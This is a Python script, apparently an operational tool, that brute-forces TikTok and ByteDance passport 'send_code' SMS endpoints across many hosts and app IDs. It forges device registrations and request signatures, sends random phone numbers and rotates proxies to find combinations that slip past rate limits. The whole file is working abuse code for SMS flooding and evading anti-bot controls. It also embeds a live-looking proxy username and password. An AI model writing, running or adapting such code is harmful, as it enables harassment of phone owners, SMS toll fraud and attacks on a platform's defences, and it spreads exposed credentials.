#!/usr/bin/env python3
"""
TikTok Seller APK Brute Force v6.0
===================================
Phase A: NEW tiktokglobalshopv.com/us hosts × ALL AIDs (web + signed)
Phase B: NEW tiktokv.eu + verification + oec-api + scc + libra + web-va hosts × ALL AIDs
Phase C: isnssdk.com family + f-p-va.isnssdk.com × ALL AIDs
Phase D: Verify + expand findings
"""

import asyncio, aiohttp, json, random, time, hashlib, uuid
from urllib.parse import urlencode
from dataclasses import dataclass, field
from typing import Dict, List

PROXY_TEMPLATE = "http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080"
REGIONS = ["AU", "DE", "SG", "FR", "GB", "NL", "JP", "CA"]
TIMEOUT = aiohttp.ClientTimeout(total=15)

try:
    import SignerPy as SP
    SIGNER_OK = True
except ImportError:
    SIGNER_OK = False

def gen_phone():
    prefixes = [("+61", 9), ("+49", 10), ("+65", 8), ("+33", 9), ("+44", 10),
                ("+1", 10), ("+92", 10), ("+91", 10), ("+81", 10)]
    prefix, digits = random.choice(prefixes)
    num = ''.join(str(random.randint(1 if i == 0 else 0, 9)) for i in range(digits))
    return f"{prefix}{num}"

def encrypt_phone(phone):
    return ''.join(format(ord(c) ^ 5, '02x') for c in phone)

def get_proxy(region=None):
    return PROXY_TEMPLATE.format(region=region or random.choice(REGIONS))

@dataclass
class Stats:
    total: int = 0; success: int = 0; rate_limited: int = 0; no_perms: int = 0
    errors: int = 0; html: int = 0; not_found: int = 0; other: int = 0
    findings: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False)

    def reset(self):
        self.total = self.success = self.rate_limited = self.no_perms = 0
        self.errors = self.html = self.not_found = self.other = 0
        self.findings = []; self.start_time = time.time()

    async def record(self, cat, detail=None):
        async with self._lock:
            self.total += 1
            setattr(self, cat, getattr(self, cat, 0) + 1)
            if detail and cat in ("success", "rate_limited"):
                self.findings.append(detail)

    def summary(self):
        elapsed = time.time() - self.start_time
        rps = self.total / elapsed if elapsed > 0 else 0
        return (f"total={self.total} suc={self.success} rl={self.rate_limited} "
                f"ec16={self.no_perms} 404={self.not_found} err={self.errors} "
                f"html={self.html} other={self.other} time={elapsed:.0f}s rps={rps:.1f}")

stats = Stats()

# NEW hosts from TikTok Seller APK
SELLER_NEW_HOSTS = [
    "api.tiktokglobalshopv.com",          # TikTok Shop API!
    "api.row.tiktokglobalshopv.com",      # ROW (Rest of World) variant
    "api.eu.tiktokglobalshopv.com",       # EU variant
    "api.tiktokglobalshopv.us",           # US variant
]

SELLER_VERIFICATION_HOSTS = [
    "oec-api.tiktokv.com",               # Open E-Commerce API!
    "scc.tiktokv.com",                    # Seller Center Core
    "verification-va.tiktokv.com",        # Verification VA
    "verification-i18n.tiktokv.com",      # Verification i18n
    "verification16-normal-useast5.tiktokv.us",   # Verification US
    "verification16-normal-useast8.tiktokv.us",   # Verification US
    "rc-verification-sg.tiktokv.com",     # RC verification SG
    "rc-verification-va.tiktokv.com",     # RC verification VA
    "rc-verification-i18n.tiktokv.com",   # RC verification i18n
    "rc-verification16-normal-useast5.tiktokv.us",
    "libra-sg.tiktokv.com",              # Libra SG
    "libra-i18n.tiktokv.com",            # Libra i18n
    "libra16-normal-useast5.tiktokv.us",  # Libra US
    "vcs-sg.tiktokv.com",                # VCS SG
    "vcs-va.tiktokv.com",                # VCS VA
    "vcs-i18n.tiktokv.com",              # VCS i18n
    "vcs16-normal-useast5.tiktokv.us",    # VCS US
    "web-va.tiktok.com",                  # NEW web variant
    "feelgood-api.tiktok.com",            # Feelgood API
    "ads.tiktok.com",                     # Ads API
]

SELLER_ISNSSDK_HOSTS = [
    "f-p-va.isnssdk.com",                # Feature platform
    "i.isnssdk.com",                      # Main
    "ichannel.isnssdk.com",               # Channel
    "mon.isnssdk.com",                    # Monitoring
    "log.isnssdk.com",                    # Log
    "rtlog.isnssdk.com",                  # Real-time log
]

# EU TLD hosts
EU_HOSTS = [
    "rc-verification.tiktokv.eu",
    "vcs16-normal-ie.tiktokv.eu",
]

ALL_AIDS = {
    1233: ("TikTok Global", "musical_ly", "com.zhiliaoapp.musically"),
    1340: ("TikTok Lite", "trill", "com.zhiliaoapp.musically.go"),
    3006: ("CapCut", "vicut", "com.lemon.lvoverseas"),
    1180: ("Helo", "musical_ly", "com.zhiliaoapp.musically"),
    2658: ("Lemon8", "musical_ly", "com.zhiliaoapp.musically"),
    2657: ("BD 2657", "musical_ly", "com.zhiliaoapp.musically"),
    7743: ("BD 7743", "musical_ly", "com.zhiliaoapp.musically"),
    2239: ("BD 2239", "musical_ly", "com.zhiliaoapp.musically"),
    259: ("BD 259", "musical_ly", "com.zhiliaoapp.musically"),
    473824: ("BD 473824", "musical_ly", "com.zhiliaoapp.musically"),
    567753: ("BD 567753", "musical_ly", "com.zhiliaoapp.musically"),
    1988: ("Douyin Web", "douyin_web", "douyin_web"),
    1459: ("TikTok Web", "tiktok_web", "tiktok_web"),
    1583: ("TikTok Ads", "tiktok_web", "tiktok_web"),
    1128: ("Douyin", "aweme", "com.ss.android.ugc.aweme"),
    1112: ("Huoshan", "live_stream", "com.ss.android.ugc.live"),
    1319: ("Pipix", "super", "com.sup.android.superb"),
    32: ("Xigua", "video_article", "com.ss.android.article.video"),
    13: ("Toutiao", "news_article", "com.ss.android.article.news"),
    1760: ("BD 1760", "musical_ly", "com.zhiliaoapp.musically"),
    4068: ("BD 4068", "musical_ly", "com.zhiliaoapp.musically"),
    4143: ("BD 4143", "musical_ly", "com.zhiliaoapp.musically"),
    6027: ("BD 6027", "musical_ly", "com.zhiliaoapp.musically"),
    6556: ("BD 6556", "musical_ly", "com.zhiliaoapp.musically"),
    6849: ("BD 6849", "musical_ly", "com.zhiliaoapp.musically"),
    8311: ("BD 8311", "musical_ly", "com.zhiliaoapp.musically"),
}

TYPE_CODES = [3635, 3532, 3637, 3634, 3734, 3733]
ENDPOINTS = ["/passport/web/send_code/", "/passport/mobile/send_code/v1/", "/passport/mobile/send_code/"]

def gen_device():
    brands = {"samsung": ["SM-S918B", "SM-A546B"], "Google": ["Pixel 8 Pro"], "OnePlus": ["IN2020"]}
    brand = random.choice(list(brands.keys()))
    model = random.choice(brands[brand])
    av = random.choice(["13", "14"])
    return {"brand": brand, "model": model, "android_version": av,
            "api_level": "33" if av == "13" else "34",
            "build_id": "UP1A.231005.007",
            "openudid": ''.join(random.choices('0123456789abcdef', k=16)),
            "cdid": str(uuid.uuid4()),
            "odin_tt": ''.join(random.choices('0123456789abcdef', k=160))}

async def register_device(session, domain, aid, app_name, package, proxy=None):
    dev = gen_device()
    ts = int(time.time())
    params = urlencode({"aid": str(aid), "app_name": app_name, "version_code": "350804",
                        "device_platform": "android", "os": "android",
                        "os_api": dev["api_level"], "os_version": dev["android_version"],
                        "device_type": dev["model"], "device_brand": dev["brand"],
                        "language": "en", "ac": "wifi", "channel": "googleplay",
                        "openudid": dev["openudid"], "cdid": dev["cdid"], "ts": str(ts)})
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": app_name, "aid": aid, "channel": "googleplay",
        "package": package, "app_version": "35.8.4", "version_code": 350804,
        "os": "Android", "os_version": dev["android_version"],
        "device_model": dev["model"], "device_brand": dev["brand"],
        "language": "en", "openudid": dev["openudid"], "cdid": dev["cdid"],
        "region": "US"}, "_gen_ts": ts})
    url = f"https://{domain}/service/2/device_register/?{params}"
    ua = f"{package}/350804 (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']})"
    try:
        async with session.post(url, data=body, headers={"Host": domain, "User-Agent": ua,
                                "Content-Type": "application/json"}, proxy=proxy, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
            if resp.status == 200:
                data = await resp.json()
                return {"device_id": str(data.get("device_id", "")),
                        "iid": str(data.get("install_id", "")), "dev": dev}
    except Exception:
        pass
    return None

def sign_req(url_params, body, cookie_str, aid):
    if SIGNER_OK:
        return SP.sign(params=url_params, payload=body, cookie=cookie_str, version=8404, aid=aid)
    ts = str(int(time.time()))
    return {"x-gorgon": hashlib.md5(f"{url_params}{ts}".encode()).hexdigest()[:20] + "00000000",
            "x-khronos": ts, "x-argus": "", "x-ladon": "",
            "x-ss-stub": hashlib.md5(body.encode()).hexdigest().upper()}

async def _classify(data, detail):
    msg = data.get("message", "")
    ec = data.get("data", {}).get("error_code", data.get("error_code", -1))
    if msg == "success":
        detail["type"] = "SUCCESS"; await stats.record("success", detail)
        print(f"\n*** SUCCESS *** AID={detail['aid']} dom={detail['domain']} ep={detail['endpoint']} tc={detail['tc']} phase={detail['phase']}")
    elif ec in (7, 1206):
        detail["type"] = "RATE_LIMITED"; await stats.record("rate_limited", detail)
    elif ec == 16: await stats.record("no_perms")
    else: await stats.record("other")

async def test_web(session, sem, domain, endpoint, aid, tc, app_name, proxy, phase):
    async with sem:
        phone = gen_phone()
        body = urlencode({"mobile": encrypt_phone(phone), "type": str(tc), "aid": str(aid),
                          "app_name": app_name, "account_sdk_source": "web", "mix_mode": "1"})
        url = f"https://{domain}{endpoint}?aid={aid}&app_name={app_name}"
        headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0",
                   "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
                   "Origin": f"https://{domain}", "X-SS-DP": str(aid)}
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False, timeout=TIMEOUT) as resp:
                if resp.status == 404: await stats.record("not_found"); return
                text = await resp.text()
                if not text.strip().startswith("{"): await stats.record("html"); return
                await _classify(json.loads(text), {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "web", "phase": phase})
        except Exception: await stats.record("errors")

async def test_signed(session, sem, domain, endpoint, aid, tc, app_name, package, proxy, phase, reg_domain=None):
    async with sem:
        phone = gen_phone()
        ts = int(time.time())
        rd = reg_domain or "api16-normal-c-useast2a.tiktokv.com"
        dev_info = await register_device(session, rd, aid, app_name, package, proxy)
        if not dev_info:
            dev_info = {"device_id": str(random.randint(10**15, 10**16-1)),
                        "iid": str(random.randint(10**15, 10**16-1)), "dev": gen_device()}
        dev = dev_info["dev"]
        body = urlencode({"mobile": encrypt_phone(phone), "type": str(tc), "aid": str(aid),
                          "app_name": app_name, "auto_read": "0", "account_sdk_source": "app",
                          "mix_mode": "1", "is6Digits": "1", "check_register": "1"})
        url_params = urlencode({"aid": str(aid), "app_name": app_name, "version_code": "350804",
                                "device_id": dev_info["device_id"], "iid": dev_info["iid"],
                                "device_platform": "android", "os_version": dev["android_version"],
                                "device_type": dev["model"], "device_brand": dev["brand"],
                                "language": "en", "ac": "wifi", "ts": str(ts)})
        cookie = f"sessionid=; install_id={dev_info['iid']}; store-country-code=us; odin_tt={dev['odin_tt']}"
        sigs = sign_req(url_params, body, cookie, aid)
        ua = f"{package}/350804 (Linux; U; Android {dev['android_version']}; en_US; {dev['model']}; Build/{dev['build_id']})"
        headers = {"Host": domain, "Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                   "X-SS-DP": str(aid), "User-Agent": ua,
                   "X-Gorgon": sigs.get("x-gorgon", ""), "X-Khronos": sigs.get("x-khronos", str(ts)),
                   "X-Argus": sigs.get("x-argus", ""), "X-Ladon": sigs.get("x-ladon", ""),
                   "X-SS-STUB": sigs.get("x-ss-stub", "")}
        url = f"https://{domain}{endpoint}?{url_params}"
        try:
            async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False, timeout=TIMEOUT) as resp:
                if resp.status == 404: await stats.record("not_found"); return
                if resp.status == 403: await stats.record("other"); return
                text = await resp.text()
                if not text.strip().startswith("{"): await stats.record("html"); return
                await _classify(json.loads(text), {"aid": aid, "domain": domain, "tc": tc,
                    "app_name": app_name, "endpoint": endpoint, "method": "signed", "phase": phase})
        except Exception: await stats.record("errors")

async def run_batch(tasks, phase_name):
    total = len(tasks)
    print(f"Testing {total:,} combos...")
    batch = 500
    for i in range(0, total, batch):
        await asyncio.gather(*tasks[i:i+batch], return_exceptions=True)
        elapsed = time.time() - stats.start_time
        rps = stats.total / elapsed if elapsed > 0 else 0
        print(f"\r[{phase_name}] {stats.total:,}/{total:,} | SUC:{stats.success} RL:{stats.rate_limited} ec16:{stats.no_perms} 404:{stats.not_found} err:{stats.errors} | {rps:.0f} req/s", end="", flush=True)
    print(f"\n{phase_name}: {stats.summary()}")
    return stats.findings[:]

async def phase_a():
    print("\n" + "="*80)
    print("PHASE A: TikTok Shop hosts (tiktokglobalshopv.com/us) x ALL AIDs")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(300)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)
    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in SELLER_NEW_HOSTS:
            for aid, (name, app_name, package) in ALL_AIDS.items():
                for ep in ENDPOINTS:
                    for tc in [3635, 3532]:
                        proxy = get_proxy()
                        tasks.append(test_web(session, sem, host, ep, aid, tc, app_name, proxy, f"phA-{host.split('.')[0]}"))
        findings = await run_batch(tasks, "Phase A")
    with open("/home/ubuntu/seller_phA.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings

async def phase_b():
    print("\n" + "="*80)
    print("PHASE B: Verification/OEC/SCC/Libra/web-va/EU hosts x ALL AIDs")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(300)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)
    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in SELLER_VERIFICATION_HOSTS + EU_HOSTS:
            for aid, (name, app_name, package) in ALL_AIDS.items():
                for ep in ["/passport/web/send_code/", "/passport/mobile/send_code/v1/"]:
                    tc = random.choice([3635, 3532])
                    proxy = get_proxy()
                    tasks.append(test_web(session, sem, host, ep, aid, tc, app_name, proxy, f"phB-{host.split('.')[0]}"))
        findings = await run_batch(tasks, "Phase B")
    with open("/home/ubuntu/seller_phB.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings

async def phase_c():
    print("\n" + "="*80)
    print("PHASE C: isnssdk.com family x ALL AIDs (signed)")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(250)
    conn = aiohttp.TCPConnector(limit=400, limit_per_host=30, ssl=False)
    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for host in SELLER_ISNSSDK_HOSTS:
            for aid, (name, app_name, package) in ALL_AIDS.items():
                for ep in ["/passport/mobile/send_code/v1/", "/passport/mobile/send_code/"]:
                    tc = random.choice([3635, 3532, 3637])
                    proxy = get_proxy()
                    tasks.append(test_signed(session, sem, host, ep, aid, tc, app_name, package, proxy, f"phC-{host.split('.')[0]}"))
        findings = await run_batch(tasks, "Phase C")
    with open("/home/ubuntu/seller_phC.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings

async def phase_d(all_findings):
    print("\n" + "="*80)
    print("PHASE D: VERIFY & EXPAND")
    print("="*80)
    stats.reset()
    sem = asyncio.Semaphore(200)
    conn = aiohttp.TCPConnector(limit=300, limit_per_host=30, ssl=False)
    if not all_findings:
        print("No findings to verify!"); return []
    tasks = []
    async with aiohttp.ClientSession(connector=conn) as session:
        for f in all_findings:
            aid = f["aid"]; domain = f["domain"]; ep = f["endpoint"]; tc = f["tc"]
            app_name = f.get("app_name", "musical_ly")
            info = ALL_AIDS.get(aid, ("", app_name, "com.zhiliaoapp.musically"))
            package = info[2]
            for region in random.sample(REGIONS, 3):
                proxy = get_proxy(region)
                if f.get("method") == "web":
                    tasks.append(test_web(session, sem, domain, ep, aid, tc, app_name, proxy, "phD-verify"))
                else:
                    tasks.append(test_signed(session, sem, domain, ep, aid, tc, app_name, package, proxy, "phD-verify"))
            # Expand to other type codes
            for etc in random.sample(TYPE_CODES, 3):
                proxy = get_proxy()
                tasks.append(test_web(session, sem, domain, ep, aid, etc, app_name, proxy, "phD-expand"))
        findings = await run_batch(tasks, "Phase D")
    with open("/home/ubuntu/seller_phD.json", "w") as fp:
        json.dump({"stats": stats.summary(), "findings": findings}, fp, indent=2)
    return findings

async def main():
    print("="*80)
    print("TIKTOK SELLER BRUTE FORCE v6.0")
    print(f"SignerPy: {'OK' if SIGNER_OK else 'MISSING'}")
    print(f"Seller hosts: {len(SELLER_NEW_HOSTS)} | Verification: {len(SELLER_VERIFICATION_HOSTS)} | EU: {len(EU_HOSTS)} | isnssdk: {len(SELLER_ISNSSDK_HOSTS)}")
    print("="*80)
    t0 = time.time()
    all_findings = []
    fa = await phase_a(); all_findings.extend(fa)
    fb = await phase_b(); all_findings.extend(fb)
    fc = await phase_c(); all_findings.extend(fc)
    fd = await phase_d(all_findings); all_findings.extend(fd)
    elapsed = time.time() - t0
    print("\n" + "="*80)
    print(f"ALL PHASES COMPLETE — {elapsed:.0f}s total")
    seen = set(); unique = []
    for f in all_findings:
        key = (f.get("aid"), f.get("domain"), f.get("endpoint"), f.get("tc"), f.get("type"))
        if key not in seen: seen.add(key); unique.append(f)
    successes = [f for f in unique if f["type"] == "SUCCESS"]
    rl = [f for f in unique if f["type"] == "RATE_LIMITED"]
    print(f"Unique: {len(unique)} | SUCCESS: {len(successes)} | RL: {len(rl)}")
    print("\nSUCCESSES:")
    for f in successes:
        print(f"  AID={f['aid']} dom={f['domain']} ep={f['endpoint']} tc={f['tc']} method={f.get('method')}")
    with open("/home/ubuntu/seller_combined_results.json", "w") as fp:
        json.dump({"total_time": elapsed, "unique": len(unique), "successes": successes, "rate_limited": rl}, fp, indent=2)

if __name__ == "__main__":
    asyncio.run(main())
